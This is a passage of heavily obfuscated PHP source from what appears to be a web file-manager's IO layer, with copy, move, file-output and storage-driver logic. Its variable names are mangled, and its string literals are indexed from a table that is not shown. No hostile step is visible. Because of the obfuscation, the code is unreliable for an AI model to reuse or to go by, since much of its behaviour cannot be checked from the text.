$àÒØ§úÌ[858], 0) == $àÒØ§úÌ[91]) { return !0; } $É§®â²¨ = new BackupDb(); if (!$É§®â²¨->index()) { return !1; } self::set(array($àÒØ§úÌ[858] => 1)); return !0; } public function dbFile() { $¬µÉ¥¾Ò =& $_SERVER[™¸œØ®Ü]; $å›ÏûœÛ = self::get(); if (_get($å›ÏûœÛ, $¬µÉ¥¾Ò[859], 0) == $¬µÉ¥¾Ò[91]) { return !0; } $ŸŞ¢Õ–ä = new BackupDbFile(); if (!$ŸŞ¢Õ–ä->index()) { return !1; } self::set(array($¬µÉ¥¾Ò[859] => 1)); return !0; } public function file() { $ÔÕÅÎï =& $_SERVER[™¸œØ®Ü]; $ñÎçãæ€ = self::get(); if (_get($ñÎçãæ€, $ÔÕÅÎï[860], 0) == $ÔÕÅÎï[91]) { return !0; } if ($ñÎçãæ€[$ÔÕÅÎï[171]] == $ÔÕÅÎï[861]) { $¬¯•Ê»· = new BackupFile(); if (!$¬¯•Ê»·->index()) { return !1; } } self::set(array($ÔÕÅÎï[860] => 1, $ÔÕÅÎï[835] => 1)); return !0; } public static function log($·á¸ÊÈ) { write_log($·á¸ÊÈ, $_SERVER[™¸œØ®Ü][862]); } } goto F×Õø²Ù•; CÁƒÅ¥ƒßí: class IO extends ClassBaseCall { public static $driverCache = array(); public static $driverListSystem = array(); public static $driverListUser = array(); public static function __callStatic($üÆÖßÆË, $Áõßïœ¿) { $ıú—¿ÓÔ =& $_SERVER[™¸œØ®Ü]; $¡şéªÁ¹ = $Áõßïœ¿; $GLOBALS[$ıú—¿ÓÔ[1246]] = $ıú—¿ÓÔ[1247] . $üÆÖßÆË; Hook::trigger($ıú—¿ÓÔ[1247] . $üÆÖßÆË . $ıú—¿ÓÔ[1248], $¡şéªÁ¹); $õ×ñÎÏ˜ = self::driverMake($Áõßïœ¿[0]); if (!$õ×ñÎÏ˜) { return !1; } if (method_exists($õ×ñÎÏ˜, $üÆÖßÆË)) { $…Ïûã§î = @call_user_func_array(array($õ×ñÎÏ˜, $üÆÖßÆË), $Áõßïœ¿); } else { if (method_exists($õ×ñÎÏ˜, $ıú—¿ÓÔ[1249])) { $…Ïûã§î = @call_user_func_array(array($õ×ñÎÏ˜, $üÆÖßÆË), $Áõßïœ¿); } else { if (method_exists(self, $üÆÖßÆË)) { $…Ïûã§î = @call_user_func_array(array(self, $üÆÖßÆË), $Áõßïœ¿); } else { $…Ïûã§î = call_user_func_array(array(parent, $üÆÖßÆË), $Áõßïœ¿); } } } Hook::trigger($ıú—¿ÓÔ[1247] . $üÆÖßÆË . $ıú—¿ÓÔ[1250], $¡şéªÁ¹, $…Ïûã§î); return $…Ïûã§î; } public static function init($Ì¸±ö¢¸) { return self::driverMake($Ì¸±ö¢¸); } public static function copy($Ù›ĞÌÎ©, $éÉ÷îòş, $ÒœÆ³‚š = false, $ËÙ«ûÚö = false) { return self::copyMoveStart($Ù›ĞÌÎ©, $éÉ÷îòş, $ÒœÆ³‚š, $_SERVER[™¸œØ®Ü][625], $ËÙ«ûÚö); } public static function move($¨î”È…Ã, $ÃÛ×ùÊä, $†í¶¿ËÊ = false, $Ôİù÷Ù‘ = false) { return self::copyMoveStart($¨î”È…Ã, $ÃÛ×ùÊä, $†í¶¿ËÊ, $_SERVER[™¸œØ®Ü][627], $Ôİù÷Ù‘); } public static function copyMoveChildren($«ŠñòÈÁ, $©ÛŒ, $É¦İæŞ = "\x63\x6f\160\x79", $ğèàîÄÜ = REPEAT_REPLACE) { $Î¦à³Íü =& $_SERVER[™¸œØ®Ü]; $”ó°ÔÍ± = $«ŠñòÈÁ; $ÇÍœ˜¬¸ = self::driverMake($«ŠñòÈÁ); $Õ¬Ñîù = $ÇÍœ˜¬¸->listPath($«ŠñòÈÁ, !0); $Õç´ıó¶ = array_merge($Õ¬Ñîù[$Î¦à³Íü[86]], $Õ¬Ñîù[$Î¦à³Íü[85]]); foreach ($Õç´ıó¶ as $Öàïã€ğ) { self::copyMoveStart($Öàïã€ğ[$Î¦à³Íü[87]], $©ÛŒ, $ğèàîÄÜ, $É¦İæŞ, !1); } if ($É¦İæŞ == $Î¦à³Íü[627]) { self::remove($”ó°ÔÍ±); } } private static function copyMoveStart($®áËÄ †, $Ïè¹“½â, $Õ·»ÄÂ•, $¹î®ñéè, $Ô©ÚæÎ†) { $îñòëÛ· =& $_SERVER[™¸œØ®Ü]; $çïÔı = array($®áËÄ †, $Ïè¹“½â, $Õ·»ÄÂ•, $Ô©ÚæÎ†); Hook::trigger($îñòëÛ·[1247] . $¹î®ñéè . $îñòëÛ·[1248], $çïÔı); $•ÇæÅ“¯ = self::copyMove($®áËÄ †, $Ïè¹“½â, $Õ·»ÄÂ•, $¹î®ñéè, $Ô©ÚæÎ†); Hook::trigger($îñòëÛ·[1247] . $¹î®ñéè . $îñòëÛ·[1250], $çïÔı, $•ÇæÅ“¯); return $•ÇæÅ“¯; } public static function saveFile($×òîø ğ, $ßø­ÄÌ, $ã‡±½’à = true) { $”¿°ğ¹ø =& $_SERVER[™¸œØ®Ü]; $“ÜËú­µ = self::info($ßø­ÄÌ); $õ«Õíú„ = self::driverMake($×òîø ğ); $´ôÀ€ã = self::driverMake($ßø­ÄÌ); $¬œÅÌĞ’ = !1; if ($´ôÀ€ã->pathParse[$”¿°ğ¹ø[1251]]) { $¬œÅÌĞ’ = $´ôÀ€ã; $µùÃ‡” = $´ôÀ€ã->pathParse[$”¿°ğ¹ø[1251]]; $´ôÀ€ã = self::driverMake($µùÃ‡”); } if ($õ«Õíú„->pathParse[$”¿°ğ¹ø[1251]]) { $ÀåŒ¿ñ± = $õ«Õíú„->pathParse[$”¿°ğ¹ø[1251]]; $õ«Õíú„ = self::driverMake($ÀåŒ¿ñ±); } $¹ÎâÆù„ = $´ôÀ€ã->pathFather($ßø­ÄÌ); $Ïƒƒçµî = !0; if (!$ã‡±½’à && self::driverIsSame($õ«Õíú„, $´ôÀ€ã)) { $Ïƒƒçµî = !1; } $”Ï¦¼Ø = self::copyFile($õ«Õíú„, $×òîø ğ, $´ôÀ€ã, $¹ÎâÆù„, $“ÜËú­µ[$”¿°ğ¹ø[32]], $Ïƒƒçµî); if ($¬œÅÌĞ’) { $”Ï¦¼Ø = $¬œÅÌĞ’->getPathOuter($”Ï¦¼Ø); } return $”Ï¦¼Ø; } private static function copyMove($é¾Çõ®Õ, $ßìŞ¼¥÷, $Ç³èÓ¯Ñ, $ó¼òĞûİ, $Ÿ˜ùì¡— = false) { $¯ÆÏÆ¯ñ =& $_SERVER[™¸œØ®Ü]; if (!$é¾Çõ®Õ || $é¾Çõ®Õ == $¯ÆÏÆ¯ñ[8] || !$ßìŞ¼¥÷) { return !1; } ignore_timeout(); $Ú¹§ƒñ = self::driverMake($é¾Çõ®Õ); $Ì•’ÁáÉ = self::driverMake($ßìŞ¼¥÷); $”¸üùÇõ = $ó¼òĞûİ == $¯ÆÏÆ¯ñ[627]; $µ˜Ãç¨‹ = !1; if ($Ì•’ÁáÉ->pathParse[$¯ÆÏÆ¯ñ[1251]]) { $µ˜Ãç¨‹ = $Ì•’ÁáÉ; $ßìŞ¼¥÷ = $Ì•’ÁáÉ->pathParse[$¯ÆÏÆ¯ñ[1251]]; $Ì•’ÁáÉ = self::driverMake($ßìŞ¼¥÷); } if ($Ú¹§ƒñ->pathParse[$¯ÆÏÆ¯ñ[1251]]) { $é¾Çõ®Õ = $Ú¹§ƒñ->pathParse[$¯ÆÏÆ¯ñ[1251]]; $Ú¹§ƒñ = self::driverMake($é¾Çõ®Õ); } self::check($Ú¹§ƒñ, $é¾Çõ®Õ, $Ì•’ÁáÉ, $ßìŞ¼¥÷); Hook::trigger($¯ÆÏÆ¯ñ[1252], $Ú¹§ƒñ, $é¾Çõ®Õ, $Ì•’ÁáÉ, $ßìŞ¼¥÷); $±±º¬Î¼ = self::driverIsSame($Ú¹§ƒñ, $Ì•’ÁáÉ); if ($±±º¬Î¼) { if ($ó¼òĞûİ == $¯ÆÏÆ¯ñ[627] && !method_exists($Ì•’ÁáÉ, $¯ÆÏÆ¯ñ[1253]) && trim($ßìŞ¼¥÷, $¯ÆÏÆ¯ñ[8]) == trim($Ì•’ÁáÉ->pathFather($é¾Çõ®Õ), $¯ÆÏÆ¯ñ[8])) { if ($Ú¹§ƒñ->pathThis($é¾Çõ®Õ) != $Ÿ˜ùì¡— && !$Ú¹§ƒñ->isOsDriver()) { return $Ú¹§ƒñ->rename($é¾Çõ®Õ, $Ÿ˜ùì¡—); } return $Ì•’ÁáÉ->getPathOuter($é¾Çõ®Õ); } if (method_exists($Ì•’ÁáÉ, $ó¼òĞûİ)) { return $Ì•’ÁáÉ->{$ó¼òĞûİ}($é¾Çõ®Õ, $ßìŞ¼¥÷, $Ç³èÓ¯Ñ, $Ÿ˜ùì¡—); } } if ($±±º¬Î¼ && $ó¼òĞûİ == $¯ÆÏÆ¯ñ[627] && $Ì•’ÁáÉ->getType() == $¯ÆÏÆ¯ñ[109]) { $»ªÊÎÒ— = $Ì•’ÁáÉ->movePath($é¾Çõ®Õ, $ßìŞ¼¥÷, $Ÿ˜ùì¡—); if ($»ªÊÎÒ—) { return $»ªÊÎÒ—; } } $ÓÛ¾Òœ¼ = $Ú¹§ƒñ->isFile($é¾Çõ®Õ); if (!$ÓÛ¾Òœ¼ && $Ì•’ÁáÉ->getType() == $¯ÆÏÆ¯ñ[842] && $Ú¹§ƒñ->getType() == $¯ÆÏÆ¯ñ[109]) { $»ªÊÎÒ— = $Ì•’ÁáÉ->copyFolderFromIO($Ú¹§ƒñ, $é¾Çõ®Õ, $ßìŞ¼¥÷, $Ç³èÓ¯Ñ, $”¸üùÇõ, $Ÿ˜ùì¡—); } else { $»ªÊÎÒ— = self::copyPath($Ú¹§ƒñ, $é¾Çõ®Õ, $Ì•’ÁáÉ, $ßìŞ¼¥÷, $Ç³èÓ¯Ñ, $”¸üùÇõ, $ÓÛ¾Òœ¼, $Ÿ˜ùì¡—); } if ($»ªÊÎÒ— && $”¸üùÇõ) { $Ú¹§ƒñ->remove($é¾Çõ®Õ); } if ($µ˜Ãç¨‹) { $»ªÊÎÒ— = $µ˜Ãç¨‹->getPathOuter($»ªÊÎÒ—); } return $»ªÊÎÒ—; } private static function check($¾îÔ…®³, $èœÔá‘ƒ, $„ËŸÙŠĞ, &$ô¶á×¡) { $†ü’áÔğ =& $_SERVER[™¸œØ®Ü]; if (self::driverIsSame($¾îÔ…®³, $„ËŸÙŠĞ) && $¾îÔ…®³->isFolder($èœÔá‘ƒ) && $¾îÔ…®³->isParentOf($èœÔá‘ƒ, $ô¶á×¡)) { show_json(LNG($†ü’áÔğ[1254]), !1); } if (!$¾îÔ…®³->exist($èœÔá‘ƒ)) { show_json(LNG($†ü’áÔğ[108]), !1); } } private static function copyPath($°‹¹ïŠ, $ÁÑÇö»¨, $­® “ù, $Ğüáå³ê, $È€ğöÇå, $„…šÇ‡Æ, $–·ËÃ´, $È£ğÚÙè = false, $€÷™Ûö· = true) { $ŒÜ«Ä²Ç =& $_SERVER[™¸œØ®Ü]; $ş±â“Á = empty($È£ğÚÙè) && $È£ğÚÙè !== $ŒÜ«Ä²Ç[230] ? $°‹¹ïŠ->pathThis($ÁÑÇö»¨) : $È£ğÚÙè; if ($È€ğöÇå) { $–ôĞ™‹å = $­® “ù->fileNameExist($Ğüáå³ê, $ş±â“Á); $Ş¯Š©± = $ş±â“Á; $ş±â“Á = $­® “ù->fileNameAuto($Ğüáå³ê, $ş±â“Á, $È€ğöÇå, !$–·ËÃ´); if (!$–ôĞ™‹å || $Ş¯Š©± != $ş±â“Á) { $È€ğöÇå = !1; } if ($€÷™Ûö· && !$È€ğöÇå) { $­® “ù->_data[$ŒÜ«Ä²Ç[1255]] = !0; } } if ($–·ËÃ´) { return self::copyFile($°‹¹ïŠ, $ÁÑÇö»¨, $­® “ù, $Ğüáå³ê, $ş±â“Á, $„…šÇ‡Æ); } if ($È€ğöÇå == REPEAT_RENAME_FOLDER) { $È€ğöÇå = !1; } $×Ö³êı = rtrim($Ğüáå³ê, $ŒÜ«Ä²Ç[8]) . $ŒÜ«Ä²Ç[8] . $ş±â“Á; $Ø¤œÊúË = $­® “ù->mkdir($­® “ù->getPath($×Ö³êı), $È€ğöÇå); $Ğüáå³ê = $­® “ù->getPathInner($Ø¤œÊúË); $¯ùúò°  = $°‹¹ïŠ->listPath($ÁÑÇö»¨, !0); $¯ùúò°  = is_array($¯ùúò° ) ? $¯ùúò°  : array($ŒÜ«Ä²Ç[86] => array(), $ŒÜ«Ä²Ç[85] => array()); $«×ÈÃ‘’ = array_merge($¯ùúò° [$ŒÜ«Ä²Ç[86]], $¯ùúò° [$ŒÜ«Ä²Ç[85]]); foreach ($«×ÈÃ‘’ as $î­½Ú™¸) { $£áÁ¶‹ = $î­½Ú™¸[$ŒÜ«Ä²Ç[33]] == $ŒÜ«Ä²Ç[232]; $ÁÑÇö»¨ = $°‹¹ïŠ->getPathInner($î­½Ú™¸[$ŒÜ«Ä²Ç[87]]); $Ş¼½½ìä = self::copyPath($°‹¹ïŠ, $ÁÑÇö»¨, $­® “ù, $Ğüáå³ê, $È€ğöÇå, $„…šÇ‡Æ, $£áÁ¶‹, !1, !1); if (!$Ş¼½½ìä) { IO::errorTips($ŒÜ«Ä²Ç[1256] . $ÁÑÇö»¨ . $ŒÜ«Ä²Ç[73] . $Ğüáå³ê); } } self::copyMoveKeepInfo($°‹¹ïŠ, $ÁÑÇö»¨, $Ø¤œÊúË); return $Ø¤œÊúË; } private static function copyFile($Õ÷û¢ö, $âİÑóş¼, $÷¤ÖÍı, $ ßÌÌ§¶, $â•†îúå, $İÙò¡ìÖ) { $ŒáùÁƒ° =& $_SERVER[™¸œØ®Ü]; $ ßÌÌ§¶ = $÷¤ÖÍı->getPath(rtrim($ ßÌÌ§¶, $ŒáùÁƒ°[8]) . $ŒáùÁƒ°[8] . $â•†îúå); $‘ÄÁ‹ = $ŒáùÁƒ°[1257] . time() . rand_string(5); Hook::trigger($ŒáùÁƒ°[1258], $Õ÷û¢ö, $âİÑóş¼, $÷¤ÖÍı, $ ßÌÌ§¶, $â•†îúå, $‘ÄÁ‹); if (self::driverIsSame($Õ÷û¢ö, $÷¤ÖÍı)) { if ($İÙò¡ìÖ) { $úÖÀù˜ = $÷¤ÖÍı->moveFile($âİÑóş¼, $ ßÌÌ§¶); } else { $úÖÀù˜ = $÷¤ÖÍı->copyFile($âİÑóş¼, $ ßÌÌ§¶); } Hook::trigger($ŒáùÁƒ°[1259], $Õ÷û¢ö, $âİÑóş¼, $÷¤ÖÍı, $ ßÌÌ§¶, $â•†îúå, $úÖÀù˜); self::copyMoveKeepInfo($Õ÷û¢ö, $âİÑóş¼, $úÖÀù˜); return $úÖÀù˜; } $ë¡Êğ©Å = TEMP_FILES; if ($GLOBALS[$ŒáùÁƒ°[6]][$ŒáùÁƒ°[92]][$ŒáùÁƒ°[883]]) { $ë¡Êğ©Å = $GLOBALS[$ŒáùÁƒ°[6]][$ŒáùÁƒ°[92]][$ŒáùÁƒ°[883]]; } $Â¨ı¦†¨ = $ë¡Êğ©Å; mk_dir($Â¨ı¦†¨); $ğŸñˆ†  = $Â¨ı¦†¨ . $‘ÄÁ‹; $–šà´Ó = $ğŸñˆ† ; $ğŸñˆ†  = $Õ÷û¢ö->download($âİÑóş¼, $ğŸñˆ† ); $ğŸñˆ†  = $Õ÷û¢ö->iconvApp($ğŸñˆ† ); if (substr($ğŸñˆ† , strlen($ë¡Êğ©Å)) == $ë¡Êğ©Å) { $İÙò¡ìÖ = !0; } $úÖÀù˜ = $÷¤ÖÍı->upload($ ßÌÌ§¶, $ğŸñˆ† , $İÙò¡ìÖ); self::remove($–šà´Ó); Hook::trigger($ŒáùÁƒ°[1259], $Õ÷û¢ö, $âİÑóş¼, $÷¤ÖÍı, $ ßÌÌ§¶, $â•†îúå, $úÖÀù˜); self::copyMoveKeepInfo($Õ÷û¢ö, $âİÑóş¼, $úÖÀù˜); return $úÖÀù˜; } private static function copyMoveKeepInfo($Àƒ…ˆ, $½°Åª«”, $¸«øŞş) { if (!$¸«øŞş) { return; } $Àò·«¦ş = $Àƒ…ˆ->info($½°Åª«”); if (!is_array($Àò·«¦ş)) { return; } IO::setModifyTime($¸«øŞş, $Àò·«¦ş[$_SERVER[™¸œØ®Ü][88]]); } public static function pathFather($ƒœ¤ã¤©) { $úé÷›í˜ = IO::init($ƒœ¤ã¤©); $‘¨’èäŸ = $úé÷›í˜->pathFather($úé÷›í˜->path); return $úé÷›í˜->getPathOuter($‘¨’èäŸ); } public static function fileOut($şóš³Ş, $ñöª·–¹ = false, $éœœ¤ø· = false, $­ß«Øñ = '') { $±Öª³ç  = self::driverMake($şóš³Ş); if ($±Öª³ç ->isFileOutServer()) { return $±Öª³ç ->fileOutServer($şóš³Ş, $ñöª·–¹, $éœœ¤ø·, $­ß«Øñ); } return $±Öª³ç ->fileOut($şóš³Ş, $ñöª·–¹, $éœœ¤ø·, $­ß«Øñ); } public static function fileOutImage($‚¸×±Û„, $¢¡»ğµ– = 250) { $Ñà„˜™æ = array(250, 600, 1200, 2000, 3000, 5000); for ($™®ÅÂäª = 0; $™®ÅÂäª < count($Ñà„˜™æ); $™®ÅÂäª++) { if ($™®ÅÂäª == 0 && $¢¡»ğµ– <= $Ñà„˜™æ[$™®ÅÂäª]) { $¢¡»ğµ– = $Ñà„˜™æ[$™®ÅÂäª]; break; } else { if ($¢¡»ğµ– > $Ñà„˜™æ[$™®ÅÂäª - 1] && $¢¡»ğµ– <= $Ñà„˜™æ[$™®ÅÂäª]) { $¢¡»ğµ– = $Ñà„˜™æ[$™®ÅÂäª]; break; } else { if ($™®ÅÂäª == count($Ñà„˜™æ) - 1 && $¢¡»ğµ– > $Ñà„˜™æ[$™®ÅÂäª]) { $¢¡»ğµ– = $Ñà„˜™æ[$™®ÅÂäª]; break; } } } } $÷Ç¶¨©² = self::driverMake($‚¸×±Û„); if ($÷Ç¶¨©²->isFileOutServer()) { return $÷Ç¶¨©²->fileOutImageServer($‚¸×±Û„, $¢¡»ğµ–); } return $÷Ç¶¨©²->fileOutImage($‚¸×±Û„, $¢¡»ğµ–); } private static function driverIsSame($»ğé©ñ”, $“ÉÔÎÒÏ) { $òÜ¤àÆ =& $_SERVER[™¸œØ®Ü]; $×ÃÁÕØ… = $»ğé©ñ”->getType(); $É¹¦ƒ‡‘ = $“ÉÔÎÒÏ->getType(); if ($×ÃÁÕØ… != $É¹¦ƒ‡‘) { return !1; } if ($×ÃÁÕØ… == $òÜ¤àÆ[842]) { return !0; } if ($×ÃÁÕØ… == $òÜ¤àÆ[109]) { return !0; } if ($»ğé©ñ”->pathDriver == $“ÉÔÎÒÏ->pathDriver) { return !0; } return !1; } public static function copyUpdate($Õƒœß™ì, $‚¶ñª¦«) { $”ô§“ñÆ =& $_SERVER[™¸œØ®Ü]; if (!IO::exist($Õƒœß™ì)) { return !1; } if (!IO::exist($‚¶ñª¦«)) { IO::mkdir($‚¶ñª¦«); } $øá­¶Óä = array_to_keyvalue(self::listAllSimple($Õƒœß™ì), $”ô§“ñÆ[87]); $‰ş˜Û‘î = array_to_keyvalue(self::listAllSimple($‚¶ñª¦«), $”ô§“ñÆ[87]); $éšî—·Û = array(); $œ™°ÏüÜ = array(); foreach ($øá­¶Óä as $»îèƒì° => $½¹ÇÇÄÊ) { if (isset($‰ş˜Û‘î[$»îèƒì°])) { if ($½¹ÇÇÄÊ[$”ô§“ñÆ[78]] == 1) { continue; } if ($‰ş˜Û‘î[$»îèƒì°][$”ô§“ñÆ[79]] == $½¹ÇÇÄÊ[$”ô§“ñÆ[79]]) { continue; } } if ($½¹ÇÇÄÊ[$”ô§“ñÆ[78]] == 1) { $œ™°ÏüÜ[] = $‚¶ñª¦« . $”ô§“ñÆ[8] . trim($»îèƒì°, $”ô§“ñÆ[8]); continue; } $Ù‚å˜Ò× = strstr(trim($»îèƒì°, $”ô§“ñÆ[8]), $”ô§“ñÆ[8]) ? get_path_father($»îèƒì°) : $”ô§“ñÆ[12]; $éšî—·Û[] = array($”ô§“ñÆ[1260] => $½¹ÇÇÄÊ[$”ô§“ñÆ[89]], $”ô§“ñÆ[1261] => rtrim($‚¶ñª¦«, $”ô§“ñÆ[8]) . $”ô§“ñÆ[8] . $Ù‚å˜Ò×, $”ô§“ñÆ[1262] => $½¹ÇÇÄÊ); } $èÌÙŠİÑ = array($”ô§“ñÆ[232] => $éšî—·Û, $”ô§“ñÆ[78] => $œ™°ÏüÜ); Hook::trigger($”ô§“ñÆ[1263], $Õƒœß™ì, $‚¶ñª¦«, $èÌÙŠİÑ); foreach ($œ™°ÏüÜ as $½¹ÇÇÄÊ) { IO::mkdir($½¹ÇÇÄÊ); } foreach ($éšî—·Û as $½¹ÇÇÄÊ) { IO::copy($½¹ÇÇÄÊ[$”ô§“ñÆ[1260]], $½¹ÇÇÄÊ[$”ô§“ñÆ[1261]], REPEAT_REPLACE); } } public static function fileSubstr($Â×ª’¶ş, $’ö‚Î´÷, $ÄÊòõğ = false) { $ü†®ÃŸá =& $_SERVER[™¸œØ®Ü]; $»¿Ş‡ş£ = self::driverMake($Â×ª’¶ş); $×›«ê¿… = $»¿Ş‡ş£->size($Â×ª’¶ş); $Êë˜ÉìÎ = $’ö‚Î´÷; $¤Ï¿‹Å™ = $ÄÊòõğ; if ($’ö‚Î´÷ < 0) { $’ö‚Î´÷ = $×›«ê¿… + $’ö‚Î´÷; } if ($ÄÊòõğ === !1) { $ÄÊòõğ = $×›«ê¿… - $’ö‚Î´÷; } if ($’ö‚Î´÷ + $ÄÊòõğ > $×›«ê¿…) { $ÄÊòõğ = $×›«ê¿… - $’ö‚Î´÷; } if (!$×›«ê¿… && $»¿Ş‡ş£->getType() == $ü†®ÃŸá[109] && !$»¿Ş‡ş£->exist($Â×ª’¶ş)) { $‹ÜÓÓ´† = get_path_this($Â×ª’¶ş); $¯²¾‰ = parse_url_query($‹ÜÓÓ´†); if (is_array($¯²¾‰) && isset($¯²¾‰[$ü†®ÃŸá[32]])) { $‹ÜÓÓ´† = urldecode($¯²¾‰[$ü†®ÃŸá[32]]); } throw new Exception($ü†®ÃŸá[1264] . LNG($ü†®ÃŸá[1265]) . $ü†®ÃŸá[1062] . clear_html($‹ÜÓÓ´†) . $ü†®ÃŸá[12]); } if ($ÄÊòõğ <= 0) { return $ü†®ÃŸá[12]; } if ($’ö‚Î´÷ < 0 || $’ö‚Î´÷ >= $×›«ê¿… || $ÄÊòõğ > 1024 * 1024 * 10) { throw new Exception("\146\x69\x6c\145\122\x65\141\x64\x20\145\162\162\x6f\x72\41\40\163\x74\x61\162\164\x3d{$’ö‚Î´÷}\73\x6c\x65\x6e\147\x74\150\75{$ÄÊòõğ}\73\x20\x73\151\172\x65\x3d{$×›«ê¿…}\73"); } $úœÍÅ¢ì = $»¿Ş‡ş£->fileSubstr($Â×ª’¶ş, $’ö‚Î´÷, $ÄÊòõğ); if (!$úœÍÅ¢ì && $ÄÊòõğ && isset($GLOBALS[$ü†®ÃŸá[1266]])) { throw new Exception($GLOBALS[$ü†®ÃŸá[1266]][$ü†®ÃŸá[1267]]); } return $úœÍÅ¢ì; } private static function driverMake(&$¬ıì¾º´) { $ „Úï‚û =& $_SERVER[™¸œØ®Ü]; $à‘ğ¥¡‹ = KodIO::parse($¬ıì¾º´); if (!self::$driverListSystem) { $Òè›Ú = Model($ „Úï‚û[852])->driverListSystem(); self::$driverListSystem = array_to_keyvalue($Òè›Ú, $ „Úï‚û[477]); } if ($à‘ğ¥¡‹[$ „Úï‚û[33]] == KodIO::KOD_IO && !self::$driverListSystem[$à‘ğ¥¡‹[$ „Úï‚û[477]]]) { throw new Exception($ „Úï‚û[1268]); return !1; } $¬ıì¾º´ = $à‘ğ¥¡‹[$ „Úï‚û[1269]]; $×­œó½˜ = self::driverGet($à‘ğ¥¡‹, $¬ıì¾º´); return $×­œó½˜; } private static function driverGet($ˆÆÇ“¼ó, &$Şø“Ò ) { $í«š–Ù =& $_SERVER[™¸œØ®Ü]; $°ÛÆ§Âß = $ˆÆÇ“¼ó[$í«š–Ù[1270]]; $Ò°¡–š = $ˆÆÇ“¼ó[$í«š–Ù[477]]; switch ($ˆÆÇ“¼ó[$í«š–Ù[33]]) { case KodIO::KOD_IO: $Üİ›òŒ€ = self::$driverListSystem[$Ò°¡–š]; break; case KodIO::KOD_SOURCE: $Şø“Ò  = $Ò°¡–š . $Şø“Ò ; $Üİ›òŒ€ = array($í«š–Ù[1271] => $í«š–Ù[1272], $í«š–Ù[6] => $ˆÆÇ“¼ó); break; case KodIO::KOD_USER_DRIVER: if (!self::$driverListUser) { $°µõÉ‡É = $GLOBALS[$í«š–Ù[1273]]; self::$driverListUser = array_to_keyvalue($°µõÉ‡É, $í«š–Ù[477]); } $Üİ›òŒ€ = self::$driverListUser[$Ò°¡–š]; break; case KodIO::KOD_SHARE_LINK: $Üİ›òŒ€ = array($í«š–Ù[1271] => $í«š–Ù[1274], $í«š–Ù[6] => $ˆÆÇ“¼ó); $ÕŸ„ã¯Î = Action($í«š–Ù[1275])->sharePathInfo($ˆÆÇ“¼ó[$í«š–Ù[87]]); $Şø“Ò  = $ÕŸ„ã¯Î[$í«š–Ù[193]]; if (!$ÕŸ„ã¯Î[$í«š–Ù[193]]) { $¸öÄ˜¡¹ = Model($í«š–Ù[671])->getInfo($ÕŸ„ã¯Î[$í«š–Ù[672]]); $Şø“Ò  = KodIO::clear($¸öÄ˜¡¹[$í«š–Ù[1276]] . $ˆÆÇ“¼ó[$í«š–Ù[1269]]); $ˆÆÇ“¼ó[$í«š–Ù[564]] = $¸öÄ˜¡¹; $ˆÆÇ“¼ó[$í«š–Ù[1251]] = $Şø“Ò ; $Üİ›òŒ€ = array($í«š–Ù[1271] => $í«š–Ù[1277], $í«š–Ù[6] => $ˆÆÇ“¼ó); } break; case KodIO::KOD_SHARE_ITEM: $Üİ›òŒ€ = array($í«š–Ù[1271] => $í«š–Ù[1278], $í«š–Ù[6] => $ˆÆÇ“¼ó); $¸öÄ˜¡¹ = Model($í«š–Ù[671])->getInfo($ˆÆÇ“¼ó[$í«š–Ù[477]]); if ($¸öÄ˜¡¹[$í«š–Ù[193]] == $í«š–Ù[230]) { $Şø“Ò  = KodIO::clear($¸öÄ˜¡¹[$í«š–Ù[1276]] . $ˆÆÇ“¼ó[$í«š–Ù[1269]]); $ˆÆÇ“¼ó[$í«š–Ù[564]] = $¸öÄ˜¡¹; $ˆÆÇ“¼ó[$í«š–Ù[1251]] = $Şø“Ò ; $Üİ›òŒ€ = array($í«š–Ù[1271] => $í«š–Ù[1279], $í«š–Ù[6] => $ˆÆÇ“¼ó); } else { if (!$Şø“Ò ) { $Şø“Ò  = $¸öÄ˜¡¹[$í«š–Ù[193]]; } } break; default: $Şø“Ò  = $ˆÆÇ“¼ó[$í«š–Ù[87]]; $Üİ›òŒ€ = array($í«š–Ù[1271] => $í«š–Ù[1280]); break; } $·¶•Í©ş = $ˆÆÇ“¼ó[$í«š–Ù[87]]; if (!isset(self::$driverCache[$·¶•Í©ş])) { $ò°»ÇŒ = strtolower($Üİ›òŒ€[$í«š–Ù[98]]); $£ğ†˜’Â = $GLOBALS[$í«š–Ù[6]][$í«š–Ù[92]][$í«š–Ù[916]]; $ ¦û˜‚— = $í«š–Ù[77] . (isset($£ğ†˜’Â[$ò°»ÇŒ]) ? $£ğ†˜’Â[$ò°»ÇŒ] : ucfirst($ò°»ÇŒ)); if (!class_exists($ ¦û˜‚—)) { show_json("{$ ¦û˜‚—}\40\x6e\157\164\40\x65\x78\x69\163\164\x73\x21", !1); } $ÑË°—‡Ú = isset($Üİ›òŒ€[$í«š–Ù[6]]) ? $Üİ›òŒ€[$í«š–Ù[6]] : !1; self::$driverCache[$·¶•Í©ş] = new $ ¦û˜‚—($ÑË°—‡Ú); } $‹Ñùò©ˆ = self::$driverCache[$·¶•Í©ş]; $‹Ñùò©ˆ->pathDriver = $°ÛÆ§Âß; $‹Ñùò©ˆ->pathBase = $í«š–Ù[12]; if (isset($Üİ›òŒ€[$í«š–Ù[6]][$í«š–Ù[1281]])) { $‹Ñùò©ˆ->pathBase = rtrim($Üİ›òŒ€[$í«š–Ù[6]][$í«š–Ù[1281]], $í«š–Ù[8]) . $í«š–Ù[8]; $Şø“Ò  = $‹Ñùò©ˆ->pathBase . ltrim($Şø“Ò , $í«š–Ù[8]); } $Şø“Ò  = $‹Ñùò©ˆ->getPath($Şø“Ò ); if (isset($ˆÆÇ“¼ó[$í«š–Ù[1251]])) { $Şø“Ò  = $ˆÆÇ“¼ó[$í«š–Ù[1251]]; } $‹Ñùò©ˆ->path = $Şø“Ò ; return $‹Ñùò©ˆ; } public static function errorTips($èè’òË = false) { $Ó•ÅÎÔü =& $_SERVER[™¸œØ®Ü]; static $——«˜½º = array(); $òğÀ‹Úª = 1000; if ($èè’òË === -1) { return $——«˜½º ? $——«˜½º[count($——«˜½º) - 1] : $Ó•ÅÎÔü[12]; } if ($èè’òË === !1) { return implode($Ó•ÅÎÔü[287], $——«˜½º); } if (count($——«˜½º) >= $òğÀ‹Úª) { $——«˜½º = array_slice($——«˜½º, $òğÀ‹Úª * 0.5, $òğÀ‹Úª); } $——«˜½º[] = $èè’òË; write_log($Ó•ÅÎÔü[176] . ACTION . $Ó•ÅÎÔü[1282] . $èè’òË, $Ó•ÅÎÔü[1283]); } public static function getLastError($¡Ì¼ç = '') { $ˆöÉŒÛş = self::errorTips(-1); return $ˆöÉŒÛş ? $ˆöÉŒÛş : $¡Ì¼ç; } } class IOArchive extends IO { function __construct() { parent::__construct(); } private static function local() { static $áÄÀşèÕ; if 